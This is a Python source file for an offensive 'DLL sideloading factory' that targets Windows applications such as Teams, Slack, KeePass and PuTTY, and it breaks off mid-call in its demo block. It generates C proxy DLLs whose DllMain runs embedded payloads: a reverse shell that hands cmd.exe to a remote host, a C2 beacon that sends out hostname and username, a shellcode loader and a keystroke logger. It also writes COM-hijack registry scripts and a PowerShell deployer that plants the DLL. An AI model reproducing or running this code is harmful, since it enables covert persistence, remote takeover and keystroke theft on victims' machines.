#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════════════════╗
║                     🏭 COM HIJACKING & DLL SIDELOADING FACTORY                            ║
║                        Advanced Persistence via DLL Manipulation                           ║
║                                                                                            ║
║  "Meşru uygulamaların gölgesinde yaşamak"                                                 ║
║                                                                                            ║
║  Features:                                                                                 ║
║  ├── DLL Hijack Opportunity Scanner                                                        ║
║  ├── COM Object Hijacking                                                                  ║
║  ├── Proxy DLL Generator (Forward exports)                                                 ║
║  ├── Sideloading Target Discovery                                                          ║
║  └── Payload Embedding Engine                                                              ║
║                                                                                            ║
║  WARNING: For authorized security testing only                                             ║
╚═══════════════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import json
import struct
import hashlib
import sqlite3
import base64
import logging
import threading
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict
from pathlib import Path
from enum import Enum

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class HijackType(Enum):
    """Types of DLL hijacking"""
    SEARCH_ORDER = "search_order"           # DLL search order hijacking
    PHANTOM = "phantom"                      # Missing DLL hijacking
    SIDE_LOADING = "side_loading"           # Trusted app sideloading
    COM_HIJACK = "com_hijack"               # COM object hijacking
    PATH_INTERCEPTION = "path_interception"  # PATH environment hijacking


class PayloadType(Enum):
    """Embedded payload types"""
    REVERSE_SHELL = "reverse_shell"
    BEACON = "beacon"
    LOADER = "loader"
    KEYLOGGER = "keylogger"
    CUSTOM = "custom"


@dataclass
class DLLTarget:
    """DLL hijacking target"""
    target_id: str
    application: str
    app_path: str
    dll_name: str
    hijack_type: HijackType
    original_dll_path: Optional[str] = None
    exports: List[str] = field(default_factory=list)
    is_signed: bool = False
    vendor: str = ""
    risk_level: str = "medium"
    notes: str = ""
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class COMTarget:
    """COM hijacking target"""
    clsid: str
    progid: str
    dll_path: str
    hijack_location: str  # HKCU or HKLM
    application: str
    is_inproc: bool = True
    notes: str = ""


@dataclass
class GeneratedDLL:
    """Generated malicious DLL"""
    dll_id: str
    target: DLLTarget
    payload_type: PayloadType
    original_exports: List[str]
    source_code: str
    compiled_path: Optional[str] = None
    shellcode: Optional[bytes] = None
    callback_url: Optional[str] = None
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class DLLSideloadFactory:
    """
    COM Hijacking & DLL Sideloading Factory
    
    Analyzes legitimate applications for DLL hijacking opportunities
    and generates proxy DLLs with embedded payloads.
    """
    
    _instance = None
    _lock = threading.Lock()
    
    # Known vulnerable applications and their DLLs
    VULNERABLE_APPS = {
        "teams": {
            "name": "Microsoft Teams",
            "paths": [
                "%LOCALAPPDATA%\\Microsoft\\Teams\\current\\Teams.exe",
                "%PROGRAMFILES%\\Microsoft\\Teams\\current\\Teams.exe"
            ],
            "dlls": [
                {"name": "CRYPTBASE.dll", "type": HijackType.SEARCH_ORDER},
                {"name": "VERSION.dll", "type": HijackType.SEARCH_ORDER},
                {"name": "USERENV.dll", "type": HijackType.SEARCH_ORDER},
            ]
        },
        "onedrive": {
            "name": "Microsoft OneDrive",
            "paths": [
                "%LOCALAPPDATA%\\Microsoft\\OneDrive\\OneDrive.exe"
            ],
            "dlls": [
                {"name": "CRYPTSP.dll", "type": HijackType.SEARCH_ORDER},
                {"name": "secur32.dll", "type": HijackType.SEARCH_ORDER},
            ]
        },
        "discord": {
            "name": "Discord",
            "paths": [
                "%LOCALAPPDATA%\\Discord\\app-*\\Discord.exe"
            ],
            "dlls": [
                {"name": "WINMM.dll", "type": HijackType.SEARCH_ORDER},
                {"name": "VERSION.dll", "type": HijackType.SEARCH_ORDER},
            ]
        },
        "slack": {
            "name": "Slack",
            "paths": [
                "%LOCALAPPDATA%\\slack\\app-*\\slack.exe"
            ],
            "dlls": [
                {"name": "CRYPTBASE.dll", "type": HijackType.SEARCH_ORDER},
                {"name": "dbghelp.dll", "type": HijackType.SEARCH_ORDER},
            ]
        },
        "zoom": {
            "name": "Zoom",
            "paths": [
                "%APPDATA%\\Zoom\\bin\\Zoom.exe"
            ],
            "dlls": [
                {"name": "VERSION.dll", "type": HijackType.SEARCH_ORDER},
                {"name": "dwmapi.dll", "type": HijackType.SEARCH_ORDER},
            ]
        },
        "vscode": {
            "name": "Visual Studio Code",
            "paths": [
                "%LOCALAPPDATA%\\Programs\\Microsoft VS Code\\Code.exe"
            ],
            "dlls": [
                {"name": "CRYPTBASE.dll", "type": HijackType.SEARCH_ORDER},
            ]
        },
        "notepadpp": {
            "name": "Notepad++",
            "paths": [
                "%PROGRAMFILES%\\Notepad++\\notepad++.exe",
                "%PROGRAMFILES(X86)%\\Notepad++\\notepad++.exe"
            ],
            "dlls": [
                {"name": "SciLexer.dll", "type": HijackType.SIDE_LOADING},
            ]
        },
        "7zip": {
            "name": "7-Zip",
            "paths": [
                "%PROGRAMFILES%\\7-Zip\\7zFM.exe"
            ],
            "dlls": [
                {"name": "7z.dll", "type": HijackType.SIDE_LOADING},
            ]
        },
        "keepass": {
            "name": "KeePass",
            "paths": [
                "%PROGRAMFILES%\\KeePass Password Safe 2\\KeePass.exe",
                "%PROGRAMFILES(X86)%\\KeePass Password Safe 2\\KeePass.exe"
            ],
            "dlls": [
                {"name": "KeePassLib.dll", "type": HijackType.SIDE_LOADING},
            ]
        },
        "putty": {
            "name": "PuTTY",
            "paths": [
                "%PROGRAMFILES%\\PuTTY\\putty.exe"
            ],
            "dlls": [
                {"name": "WINMM.dll", "type": HijackType.SEARCH_ORDER},
            ]
        }
    }
    
    # Known COM objects that can be hijacked
    COM_HIJACK_TARGETS = [
        {
            "clsid": "{BCDE0395-E52F-467C-8E3D-C4579291692E}",
            "progid": "MMDeviceEnumerator",
            "description": "Audio device enumeration - used by many apps",
            "applications": ["chrome.exe", "firefox.exe", "spotify.exe"]
        },
        {
            "clsid": "{0A29FF9E-7F9C-4437-8B11-F424491E3931}",
            "progid": "TaskScheduler",
            "description": "Task Scheduler COM object",
            "applications": ["mmc.exe", "schtasks.exe"]
        },
        {
            "clsid": "{F82B4EF1-93A9-4DDE-8015-F7950A1A6E31}",
            "progid": "SearchFilterHost",
            "description": "Windows Search protocol handler",
            "applications": ["SearchProtocolHost.exe"]
        },
        {
            "clsid": "{4590F811-1D3A-11D0-891F-00AA004B2E24}",
            "progid": "WbemScripting.SWbemLocator",
            "description": "WMI Scripting - high privilege potential",
            "applications": ["wmiprvse.exe", "powershell.exe"]
        },
        {
            "clsid": "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}",
            "progid": "ShellBrowserWindow",
            "description": "Shell browser - Explorer integration",
            "applications": ["explorer.exe"]
        }
    ]
    
    # DLL export signatures for common Windows DLLs
    COMMON_DLL_EXPORTS = {
        "VERSION.dll": [
            "GetFileVersionInfoA", "GetFileVersionInfoW",
            "GetFileVersionInfoExA", "GetFileVersionInfoExW",
            "GetFileVersionInfoSizeA", "GetFileVersionInfoSizeW",
            "GetFileVersionInfoSizeExA", "GetFileVersionInfoSizeExW",
            "VerFindFileA", "VerFindFileW",
            "VerInstallFileA", "VerInstallFileW",
            "VerLanguageNameA", "VerLanguageNameW",
            "VerQueryValueA", "VerQueryValueW"
        ],
        "CRYPTBASE.dll": [
            "SystemFunction001", "SystemFunction002", "SystemFunction003",
            "SystemFunction004", "SystemFunction005", "SystemFunction006",
            "SystemFunction007", "SystemFunction008", "SystemFunction009",
            "SystemFunction010", "SystemFunction011", "SystemFunction012",
            "SystemFunction013", "SystemFunction025", "SystemFunction035",
            "SystemFunction036", "SystemFunction040", "SystemFunction041"
        ],
        "WINMM.dll": [
            "CloseDriver", "DefDriverProc", "DriverCallback",
            "DrvGetModuleHandle", "GetDriverModuleHandle",
            "PlaySoundA", "PlaySoundW", "mciExecute",
            "mciGetCreatorTask", "mciGetDeviceIDA", "mciGetDeviceIDW",
            "mciGetDriverData", "mciGetErrorStringA", "mciGetErrorStringW",
            "mciSendCommandA", "mciSendCommandW", "mciSendStringA", "mciSendStringW",
            "midiConnect", "midiDisconnect", "midiInClose", "midiInGetDevCapsA",
            "midiOutClose", "midiOutGetDevCapsA", "midiOutOpen",
            "timeBeginPeriod", "timeEndPeriod", "timeGetDevCaps",
            "timeGetSystemTime", "timeGetTime", "waveInClose", "waveOutClose"
        ],
        "USERENV.dll": [
            "CreateEnvironmentBlock", "DestroyEnvironmentBlock",
            "ExpandEnvironmentStringsForUserA", "ExpandEnvironmentStringsForUserW",
            "GetAllUsersProfileDirectoryA", "GetAllUsersProfileDirectoryW",
            "GetDefaultUserProfileDirectoryA", "GetDefaultUserProfileDirectoryW",
            "GetProfilesDirectoryA", "GetProfilesDirectoryW",
            "GetUserProfileDirectoryA", "GetUserProfileDirectoryW",
            "LoadUserProfileA", "LoadUserProfileW",
            "RegisterGPNotification", "UnloadUserProfile", "UnregisterGPNotification"
        ],
        "dbghelp.dll": [
            "MiniDumpWriteDump", "SymCleanup", "SymEnumSymbols",
            "SymFromAddr", "SymFromName", "SymGetLineFromAddr64",
            "SymGetModuleBase64", "SymGetModuleInfo64", "SymGetOptions",
            "SymGetSearchPath", "SymInitialize", "SymLoadModule64",
            "SymSetOptions", "SymSetSearchPath", "SymUnloadModule64",
            "UnDecorateSymbolName"
        ]
    }
    
    def __new__(cls, db_path: str = "dll_sideload_factory.db"):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance
    
    def __init__(self, db_path: str = "dll_sideload_factory.db"):
        if self._initialized:
            return
        
        self.db_path = db_path
        self._init_database()
        self._initialized = True
        logger.info("🏭 DLL Sideload Factory initialized")
    
    def _init_database(self):
        """Initialize SQLite database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS dll_targets (
                    target_id TEXT PRIMARY KEY,
                    application TEXT NOT NULL,
                    app_path TEXT,
                    dll_name TEXT NOT NULL,
                    hijack_type TEXT NOT NULL,
                    original_dll_path TEXT,
                    exports TEXT,
                    is_signed INTEGER DEFAULT 0,
                    vendor TEXT,
                    risk_level TEXT DEFAULT 'medium',
                    notes TEXT,
                    discovered_at TEXT
                );
                
                CREATE TABLE IF NOT EXISTS com_targets (
                    clsid TEXT PRIMARY KEY,
                    progid TEXT,
                    dll_path TEXT,
                    hijack_location TEXT,
                    application TEXT,
                    is_inproc INTEGER DEFAULT 1,
                    notes TEXT
                );
                
                CREATE TABLE IF NOT EXISTS generated_dlls (
                    dll_id TEXT PRIMARY KEY,
                    target_id TEXT,
                    payload_type TEXT,
                    original_exports TEXT,
                    source_code TEXT,
                    compiled_path TEXT,
                    shellcode BLOB,
                    callback_url TEXT,
                    created_at TEXT,
                    FOREIGN KEY (target_id) REFERENCES dll_targets(target_id)
                );
                
                CREATE TABLE IF NOT EXISTS deployments (
                    deployment_id TEXT PRIMARY KEY,
                    dll_id TEXT,
                    target_path TEXT,
                    deployed_at TEXT,
                    status TEXT,
                    FOREIGN KEY (dll_id) REFERENCES generated_dlls(dll_id)
                );
            """)
    
    def scan_for_opportunities(self, target_apps: List[str] = None) -> List[DLLTarget]:
        """
        Scan for DLL hijacking opportunities
        
        Args:
            target_apps: Specific apps to scan, or None for all known
            
        Returns:
            List of potential DLL hijacking targets
        """
        targets = []
        apps_to_scan = target_apps or list(self.VULNERABLE_APPS.keys())
        
        for app_key in apps_to_scan:
            if app_key not in self.VULNERABLE_APPS:
                continue
            
            app_info = self.VULNERABLE_APPS[app_key]
            
            for dll_info in app_info["dlls"]:
                target = DLLTarget(
                    target_id=hashlib.md5(f"{app_key}_{dll_info['name']}".encode()).hexdigest()[:12],
                    application=app_info["name"],
                    app_path=app_info["paths"][0],
                    dll_name=dll_info["name"],
                    hijack_type=dll_info["type"],
                    exports=self.COMMON_DLL_EXPORTS.get(dll_info["name"], []),
                    risk_level="high" if dll_info["type"] == HijackType.SIDE_LOADING else "medium",
                    notes=f"Known vulnerable DLL for {app_info['name']}"
                )
                targets.append(target)
                self._save_target(target)
        
        logger.info(f"🔍 Found {len(targets)} DLL hijacking opportunities")
        return targets
    
    def scan_com_hijack_opportunities(self) -> List[COMTarget]:
        """
        Scan for COM hijacking opportunities
        
        Returns:
            List of potential COM hijacking targets
        """
        com_targets = []
        
        for com_info in self.COM_HIJACK_TARGETS:
            target = COMTarget(
                clsid=com_info["clsid"],
                progid=com_info["progid"],
                dll_path="",  # Would be populated from registry scan
                hijack_location="HKCU",  # HKCU takes precedence
                application=", ".join(com_info["applications"]),
                notes=com_info["description"]
            )
            com_targets.append(target)
            self._save_com_target(target)
        
        logger.info(f"🔍 Found {len(com_targets)} COM hijacking opportunities")
        return com_targets
    
    def generate_proxy_dll(
        self,
        target: DLLTarget,
        payload_type: PayloadType,
        callback_url: str = None,
        custom_shellcode: bytes = None
    ) -> GeneratedDLL:
        """
        Generate a proxy DLL that forwards exports to the real DLL
        while executing a payload
        
        Args:
            target: DLL target information
            payload_type: Type of payload to embed
            callback_url: C2 callback URL
            custom_shellcode: Custom shellcode bytes
            
        Returns:
            Generated DLL information with source code
        """
        exports = target.exports or self.COMMON_DLL_EXPORTS.get(target.dll_name, [])
        
        # Generate the proxy DLL source code
        source_code = self._generate_proxy_source(
            dll_name=target.dll_name,
            exports=exports,
            payload_type=payload_type,
            callback_url=callback_url,
            custom_shellcode=custom_shellcode
        )
        
        generated = GeneratedDLL(
            dll_id=hashlib.md5(f"{target.target_id}_{datetime.now().isoformat()}".encode()).hexdigest()[:12],
            target=target,
            payload_type=payload_type,
            original_exports=exports,
            source_code=source_code,
            callback_url=callback_url,
            shellcode=custom_shellcode
        )
        
        self._save_generated_dll(generated)
        logger.info(f"🏭 Generated proxy DLL for {target.dll_name}")
        
        return generated
    
    def _generate_proxy_source(
        self,
        dll_name: str,
        exports: List[str],
        payload_type: PayloadType,
        callback_url: str = None,
        custom_shellcode: bytes = None
    ) -> str:
        """Generate C source code for proxy DLL"""
        
        # Base DLL name without extension
        base_name = dll_name.replace(".dll", "").replace(".DLL", "")
        real_dll = f"{base_name}_orig.dll"
        
        # Generate export forwards
        export_forwards = []
        for export in exports:
            export_forwards.append(f'#pragma comment(linker, "/export:{export}={real_dll}.{export}")')
        
        # Generate payload based on type
        payload_code = self._generate_payload_code(payload_type, callback_url, custom_shellcode)
        
        source = f'''/*
 * Proxy DLL: {dll_name}
 * Generated by DLL Sideload Factory
 * Target: Forward to {real_dll}
 * 
 * Compilation (MinGW):
 *   x86_64-w64-mingw32-gcc -shared -o {dll_name} proxy.c -lws2_32
 */

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// Forward exports to original DLL
{chr(10).join(export_forwards)}

// Payload execution flag
static BOOL g_PayloadExecuted = FALSE;
static CRITICAL_SECTION g_CriticalSection;

{payload_code}

// Execute payload in separate thread
DWORD WINAPI PayloadThread(LPVOID lpParam) {{
    ExecutePayload();
    return 0;
}}

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            InitializeCriticalSection(&g_CriticalSection);
            
            EnterCriticalSection(&g_CriticalSection);
            if (!g_PayloadExecuted) {{
                g_PayloadExecuted = TRUE;
                // Execute payload in background thread
                CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
            }}
            LeaveCriticalSection(&g_CriticalSection);
            break;
            
        case DLL_PROCESS_DETACH:
            DeleteCriticalSection(&g_CriticalSection);
            break;
    }}
    return TRUE;
}}
'''
        return source
    
    def _generate_payload_code(
        self,
        payload_type: PayloadType,
        callback_url: str = None,
        custom_shellcode: bytes = None
    ) -> str:
        """Generate payload code based on type"""
        
        if payload_type == PayloadType.REVERSE_SHELL:
            host, port = self._parse_callback_url(callback_url)
            return f'''
// Reverse Shell Payload
void ExecutePayload() {{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("{host}");
    server.sin_port = htons({port});
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {{
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
        
        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }}
    
    closesocket(sock);
    WSACleanup();
}}
'''
        
        elif payload_type == PayloadType.BEACON:
            host, port = self._parse_callback_url(callback_url)
            return f'''
// Beacon Payload - Periodic callback
#define BEACON_INTERVAL 60000  // 60 seconds

void ExecutePayload() {{
    WSADATA wsaData;
    char hostname[256];
    char username[256];
    char beacon_data[1024];
    DWORD size = 256;
    
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    gethostname(hostname, sizeof(hostname));
    GetUserNameA(username, &size);
    
    while (1) {{
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr("{host}");
        server.sin_port = htons({port});
        
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {{
            snprintf(beacon_data, sizeof(beacon_data), 
                     "BEACON|%s|%s|%lu", hostname, username, GetCurrentProcessId());
            send(sock, beacon_data, strlen(beacon_data), 0);
            
            // Receive and execute commands
            char cmd_buffer[4096];
            int received = recv(sock, cmd_buffer, sizeof(cmd_buffer) - 1, 0);
            if (received > 0) {{
                cmd_buffer[received] = '\\0';
                // Execute received command...
            }}
        }}
        closesocket(sock);
        Sleep(BEACON_INTERVAL);
    }}
    WSACleanup();
}}
'''
        
        elif payload_type == PayloadType.LOADER:
            return f'''
// Shellcode Loader Payload
unsigned char shellcode[] = {{ {self._format_shellcode(custom_shellcode or b"\\x90\\x90\\x90\\xcc")} }};

void ExecutePayload() {{
    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem) {{
        RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));
        
        // Execute via callback
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
    }}
}}
'''
        
        elif payload_type == PayloadType.KEYLOGGER:
            return f'''
// Keylogger Payload
#define LOG_FILE "C:\\\\Windows\\\\Temp\\\\log.dat"

HHOOK g_Hook = NULL;
FILE* g_LogFile = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {{
    if (nCode >= 0 && wParam == WM_KEYDOWN) {{
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (g_LogFile) {{
            HWND hwnd = GetForegroundWindow();
            char title[256];
            GetWindowTextA(hwnd, title, sizeof(title));
            fprintf(g_LogFile, "[%s] %d\\n", title, kbStruct->vkCode);
            fflush(g_LogFile);
        }}
    }}
    return CallNextHookEx(g_Hook, nCode, wParam, lParam);
}}

void ExecutePayload() {{
    g_LogFile = fopen(LOG_FILE, "a");
    g_Hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {{
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }}
    
    UnhookWindowsHookEx(g_Hook);
    if (g_LogFile) fclose(g_LogFile);
}}
'''
        
        else:  # CUSTOM
            return '''
// Custom Payload - Replace with your code
void ExecutePayload() {
    // Your custom payload here
    MessageBoxA(NULL, "DLL Loaded Successfully", "Proxy DLL", MB_OK);
}
'''
    
    def _parse_callback_url(self, url: str) -> Tuple[str, int]:
        """Parse callback URL to host and port"""
        if not url:
            return "127.0.0.1", 4444
        
        # Handle tcp://host:port or host:port
        url = url.replace("tcp://", "").replace("http://", "").replace("https://", "")
        
        if ":" in url:
            host, port = url.split(":", 1)
            return host, int(port)
        
        return url, 4444
    
    def _format_shellcode(self, shellcode: bytes) -> str:
        """Format shellcode bytes as C array"""
        if not shellcode:
            return "0x90, 0x90, 0x90, 0xCC"  # NOP NOP NOP INT3
        
        return ", ".join(f"0x{b:02x}" for b in shellcode)
    
    def generate_com_hijack_reg(self, target: COMTarget, dll_path: str) -> str:
        """
        Generate registry script for COM hijacking
        
        Args:
            target: COM target information
            dll_path: Path to malicious DLL
            
        Returns:
            Registry script content
        """
        reg_script = f'''Windows Registry Editor Version 5.00

; COM Hijacking for {target.progid}
; CLSID: {target.clsid}
; This creates an HKCU override that takes precedence over HKLM

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{target.clsid}]
@="{target.progid}"

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{target.clsid}\\InprocServer32]
@="{dll_path.replace(chr(92), chr(92)+chr(92))}"
"ThreadingModel"="Both"

; Backup original values before applying:
; reg export "HKLM\\SOFTWARE\\Classes\\CLSID\\{target.clsid}" backup.reg /y

; To remove hijack:
; reg delete "HKCU\\Software\\Classes\\CLSID\\{target.clsid}" /f
'''
        return reg_script
    
    def generate_powershell_deployer(self, generated_dll: GeneratedDLL) -> str:
        """
        Generate PowerShell script to deploy the DLL
        
        Args:
            generated_dll: Generated DLL information
            
        Returns:
            PowerShell deployment script
        """
        target = generated_dll.target
        
        ps_script = f'''<#
.SYNOPSIS
    DLL Sideload Deployer for {target.application}
    
.DESCRIPTION
    Deploys proxy DLL for DLL sideloading attack
    Target: {target.dll_name}
    Type: {target.hijack_type.value}
#>

param(
    [string]$DLLPath = ".\\{target.dll_name}",
    [switch]$Backup,
    [switch]$Restore
)

$ErrorActionPreference = "Stop"

# Resolve target application path
$AppPath = [Environment]::ExpandEnvironmentVariables("{target.app_path}")
$TargetDir = Split-Path $AppPath -Parent
$TargetDLL = Join-Path $TargetDir "{target.dll_name}"
$BackupDLL = Join-Path $TargetDir "{target.dll_name}.bak"
$OrigDLL = Join-Path $TargetDir "{target.dll_name.replace('.dll', '_orig.dll')}"

# Check if app exists
if (-not (Test-Path $AppPath)) {{
    # Try to find with wildcard
    $pattern = $AppPath -replace '\\*', '*'
    $found = Get-ChildItem -Path (Split-Path $pattern -Parent) -Filter (Split-Path $pattern -Leaf) -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found) {{
        $AppPath = $found.FullName
        $TargetDir = Split-Path $AppPath -Parent
        $TargetDLL = Join-Path $TargetDir "{target.dll_name}"
        $BackupDLL = Join-Path $TargetDir "{target.dll_name}.bak"
        $OrigDLL = Join-Path $TargetDir "{target.dll_name.replace('.dll', '_orig.dll')}"
    }} else {{
        Write-Error "[!] Application not found: $AppPath"
        exit 1
    }}
}}

if ($Restore) {{
    Write-Host "[*] Restoring original DLL..."
    if (Test-Path $BackupDLL) {{
        Remove-Item $TargetDLL -Force -ErrorAction SilentlyContinue
        Remove-Item $OrigDLL -Force -ErrorAction SilentlyContinue
        Rename-Item $BackupDLL $TargetDLL
        Write-Host "[+] Restored successfully"
    }} else {{
        Write-Error "[!] Backup not found"
    }}
    exit 0
}}

Write-Host "[*] Target Application: $AppPath"
Write-Host "[*] Target DLL: $TargetDLL"

# Backup original if exists and requested
if ($Backup -and (Test-Path $TargetDLL)) {{
    Write-Host "[*] Backing up original DLL..."
    Copy-Item $TargetDLL $BackupDLL -Force
}}

# If original exists in System32, create forwarding copy
$System32DLL = Join-Path $env:SystemRoot "System32\\{target.dll_name}"
if (Test-Path $System32DLL) {{
    Write-Host "[*] Copying original for forwarding..."
    Copy-Item $System32DLL $OrigDLL -Force
}}

# Deploy malicious DLL
Write-Host "[*] Deploying proxy DLL..."
Copy-Item $DLLPath $TargetDLL -Force

Write-Host "[+] Deployment complete!"
Write-Host "[+] Payload will execute when $($AppPath | Split-Path -Leaf) is launched"
Write-Host ""
Write-Host "[*] To restore: .\\deploy.ps1 -Restore"
'''
        return ps_script
    
    def analyze_pe_exports(self, dll_path: str) -> List[str]:
        """
        Analyze a PE file to extract its exports
        
        Args:
            dll_path: Path to DLL file
            
        Returns:
            List of exported function names
        """
        exports = []
        
        try:
            with open(dll_path, 'rb') as f:
                # Read DOS header
                dos_header = f.read(64)
                if dos_header[:2] != b'MZ':
                    return exports
                
                # Get PE header offset
                pe_offset = struct.unpack('<I', dos_header[60:64])[0]
                f.seek(pe_offset)
                
                # Read PE signature
                pe_sig = f.read(4)
                if pe_sig != b'PE\x00\x00':
                    return exports
                
                # Read COFF header
                coff_header = f.read(20)
                machine = struct.unpack('<H', coff_header[0:2])[0]
                num_sections = struct.unpack('<H', coff_header[2:4])[0]
                optional_header_size = struct.unpack('<H', coff_header[16:18])[0]
                
                # Read optional header
                optional_header = f.read(optional_header_size)
                
                # Get export directory RVA (depends on 32/64 bit)
                if optional_header[:2] == b'\x0b\x01':  # PE32
                    export_rva = struct.unpack('<I', optional_header[96:100])[0]
                    export_size = struct.unpack('<I', optional_header[100:104])[0]
                else:  # PE32+
                    export_rva = struct.unpack('<I', optional_header[112:116])[0]
                    export_size = struct.unpack('<I', optional_header[116:120])[0]
                
                if export_rva == 0:
                    return exports
                
                # This is a simplified extraction - full implementation would
                # need section mapping to convert RVA to file offset
                logger.info(f"Found export directory at RVA 0x{export_rva:X}")
                
        except Exception as e:
            logger.error(f"Error analyzing PE: {e}")
        
        return exports
    
    def get_targets(self) -> List[Dict]:
        """Get all discovered targets from database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT * FROM dll_targets ORDER BY discovered_at DESC")
            return [dict(row) for row in cursor.fetchall()]
    
    def get_com_targets(self) -> List[Dict]:
        """Get all COM hijacking targets"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT * FROM com_targets")
            return [dict(row) for row in cursor.fetchall()]
    
    def get_generated_dlls(self) -> List[Dict]:
        """Get all generated DLLs"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("""
                SELECT g.*, t.application, t.dll_name 
                FROM generated_dlls g
                JOIN dll_targets t ON g.target_id = t.target_id
                ORDER BY g.created_at DESC
            """)
            return [dict(row) for row in cursor.fetchall()]
    
    def _save_target(self, target: DLLTarget):
        """Save DLL target to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO dll_targets 
                (target_id, application, app_path, dll_name, hijack_type, original_dll_path,
                 exports, is_signed, vendor, risk_level, notes, discovered_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                target.target_id, target.application, target.app_path, target.dll_name,
                target.hijack_type.value, target.original_dll_path,
                json.dumps(target.exports), int(target.is_signed), target.vendor,
                target.risk_level, target.notes, target.discovered_at
            ))
    
    def _save_com_target(self, target: COMTarget):
        """Save COM target to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO com_targets 
                (clsid, progid, dll_path, hijack_location, application, is_inproc, notes)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                target.clsid, target.progid, target.dll_path, target.hijack_location,
                target.application, int(target.is_inproc), target.notes
            ))
    
    def _save_generated_dll(self, generated: GeneratedDLL):
        """Save generated DLL to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT INTO generated_dlls 
                (dll_id, target_id, payload_type, original_exports, source_code,
                 compiled_path, shellcode, callback_url, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                generated.dll_id, generated.target.target_id, generated.payload_type.value,
                json.dumps(generated.original_exports), generated.source_code,
                generated.compiled_path, generated.shellcode, generated.callback_url,
                generated.created_at
            ))
    
    def get_stats(self) -> Dict:
        """Get factory statistics"""
        with sqlite3.connect(self.db_path) as conn:
            targets = conn.execute("SELECT COUNT(*) FROM dll_targets").fetchone()[0]
            com_targets = conn.execute("SELECT COUNT(*) FROM com_targets").fetchone()[0]
            generated = conn.execute("SELECT COUNT(*) FROM generated_dlls").fetchone()[0]
            
            return {
                "dll_targets": targets,
                "com_targets": com_targets,
                "generated_dlls": generated,
                "known_apps": len(self.VULNERABLE_APPS),
                "known_com_objects": len(self.COM_HIJACK_TARGETS)
            }


# Singleton instance
_factory_instance = None

def get_factory() -> DLLSideloadFactory:
    """Get or create the factory singleton"""
    global _factory_instance
    if _factory_instance is None:
        _factory_instance = DLLSideloadFactory()
    return _factory_instance


if __name__ == "__main__":
    # Demo usage
    factory = get_factory()
    
    print("🏭 DLL Sideload Factory Demo")
    print("=" * 60)
    
    # Scan for opportunities
    targets = factory.scan_for_opportunities()
    print(f"\n📋 Found {len(targets)} DLL hijacking targets:")
    for t in targets[:5]:
        print(f"  • {t.application} → {t.dll_name} ({t.hijack_type.value})")
    
    # Scan COM targets
    com_targets = factory.scan_com_hijack_opportunities()
    print(f"\n📋 Found {len(com_targets)} COM hijacking targets:")
    for c in com_targets[:3]:
        print(f"  • {c.progid} ({c.clsid})")
    
    # Generate a proxy DLL
    if targets:
        print(f"\n🔧 Generating proxy DLL for {targets[0].dll_name}...")
        generated = factory.generate_proxy_dll(
            target=targets[0],
